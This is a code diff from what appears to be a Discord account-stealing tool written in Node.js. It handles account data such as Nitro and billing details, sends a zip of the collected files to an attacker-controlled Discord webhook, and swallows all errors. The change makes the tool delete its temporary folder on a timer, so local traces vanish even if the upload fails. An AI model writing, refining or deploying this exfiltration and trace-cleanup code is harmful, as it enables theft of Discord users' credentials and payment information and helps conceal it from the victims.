@@ -9,6 +9,7 @@ const FormData = require('form-data');
 const { rmSync, readFileSync } = require('fs');
 const { userAgent } = require('../config');
 const { nitroSubscriptionType, billingType, accountFlags, avatarURL } = require('../util/discord-account');
+const { sleep } = require('../util/general');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
 
@@ -104,9 +105,8 @@ module.exports = async (zipFile) => {
   axios.post(webhook.url, data, {
     headers: { 'Content-Type': 'multipart/form-data', 'User-Agent': userAgent },
   })
-    .then(() => {
-      // Zip sent to Discord webhook, now we can delete all the files
-      rmSync(tempFolder, { recursive: true });
-    })
+    .then(() => {})
     .catch(() => {});
+
+  sleep(1000).then(() => rmSync(tempFolder, { recursive: true }));
 };
